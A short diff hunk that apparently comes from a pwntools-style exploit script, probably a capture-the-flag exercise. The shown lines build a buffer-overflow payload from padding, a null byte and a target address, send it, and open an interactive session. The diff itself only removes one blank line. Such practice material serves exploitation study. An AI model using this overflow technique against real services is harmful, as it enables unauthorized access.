@@ -8,7 +8,6 @@ payload = ""
 payload += "A"*offset + "\x00"
 #payload += "A"*offset2
 payload += target
-
 r.sendline(payload)
 r.interactive()
 
